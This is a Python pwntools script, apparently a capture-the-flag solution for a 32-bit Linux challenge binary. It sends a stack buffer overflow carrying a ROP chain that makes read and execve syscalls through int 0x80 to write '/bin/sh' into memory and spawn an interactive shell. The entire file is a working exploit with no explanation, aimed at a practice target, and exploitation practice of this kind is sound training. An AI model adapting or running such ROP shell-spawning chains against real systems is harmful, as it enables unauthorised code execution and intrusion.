from pwn import *
from kk import *
context(arch='i386', os='linux')

#p = remote('pwn.challenge.ctf.show', 28191)
p = process('./pwn')
e = ELF('./pwn')

pop_eax = 0x080bb2c6
pop_edx_ecx_ebx = 0x0806ecb0
int_80 = 0x0806f350
bin_sh = 0x080EAFE0
main = e.symbols['main']

GDB(p)
p.recvuntil(b"where is my system?")
payload = b'A' * 44 + p32(pop_eax) + p32(3) + p32(pop_edx_ecx_ebx) + p32(0x30) + p32(bin_sh) + p32(0) + p32(int_80) 
payload += p32(main)
p.sendline(payload)
pause()
p.send(b"/bin/sh\x00")

p.recvuntil(b"where is my system?")
payload = b'A' * 44 + p32(pop_eax) + p32(11) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bin_sh) + p32(int_80)
p.sendline(payload)

p.interactive()